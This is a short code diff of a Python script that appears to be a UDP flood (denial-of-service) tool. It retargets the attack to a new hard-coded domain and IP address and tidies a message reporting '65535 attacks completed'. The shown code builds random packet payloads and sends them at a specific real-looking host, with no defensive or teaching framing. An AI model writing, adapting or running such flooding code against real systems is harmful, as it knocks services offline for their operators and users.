@@ -14,9 +14,9 @@ sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
 # Get ip.
-url = "liwuhe51.top"
+url = "fwe22.top"
 #ip = socket.gethostbyname(url)
-ip = "103.82.54.28"
+ip = "103.215.51.92"
 
 # Value.
 sent = 1
@@ -37,5 +37,4 @@ if i == 1:
             dtime = now.strftime("%Y-%m-%d %H:%M:%S")
             
     except:
-		print('\n\033[31;1m65535 attacks completed\033[0m')
-        print('\n\033[31;1mExited\033[0m')
+        print('\n\033[31;1m65535 attacks completed, Exited\033[0m')
